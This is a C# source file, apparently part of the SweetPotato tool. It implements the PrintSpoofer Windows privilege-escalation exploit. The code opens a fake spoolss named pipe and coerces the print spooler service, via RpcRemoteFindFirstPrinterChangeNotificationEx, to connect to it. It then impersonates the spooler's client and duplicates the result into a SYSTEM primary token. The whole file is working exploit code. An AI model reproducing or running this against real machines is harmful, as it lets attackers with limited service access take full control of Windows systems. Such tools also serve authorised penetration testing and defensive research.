using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32;
using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SweetPotato {
    internal class PrintSpoofer {

        string pipeName = Guid.NewGuid().ToString();
        string hostName = System.Net.Dns.GetHostName();

        NamedPipeServerStream spoolPipe;
        Thread spoolPipeThread;
        IntPtr systemImpersonationToken = IntPtr.Zero;

        public IntPtr Token { get {return systemImpersonationToken; } }

        void SpoolPipeThread() {

            byte[] data = new byte[4];

            spoolPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\spoolss", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
            spoolPipe.WaitForConnection();
            spoolPipe.Read(data, 0, 4);

            spoolPipe.RunAsClient(() => {

                IntPtr tokenHandle;
                ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(), ImpersonationToken.TOKEN_ALL_ACCESS, false, out tokenHandle);
                ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,
                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken);
            });

            spoolPipe.Close();
        }

        public PrintSpoofer() {
            spoolPipeThread = new Thread(SpoolPipeThread);
            spoolPipeThread.Start();
        }

        public void TriggerPrintSpoofer() {

            string captureServer = String.Format($"\\\\{hostName}/pipe/{pipeName}");
            string printerHost = String.Format($"\\\\{hostName}");

            Client c = new Client();

            NdrContextHandle handle;
            Struct_0 devModeContainer = new Struct_0();

            int PRINTER_CHANGE_ADD_JOB = 0x00000100;

            c.Connect(new RpcEndpoint( c.InterfaceId, c.InterfaceVersion, "ncacn_np:[\\\\pipe\\\\spoolss]", false), null);

            c.Connect();

            int result = c.RpcOpenPrinter(printerHost, out handle, null, devModeContainer, 0);
            c.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, null);
            c.RpcClosePrinter(ref handle);
        }
    }
}
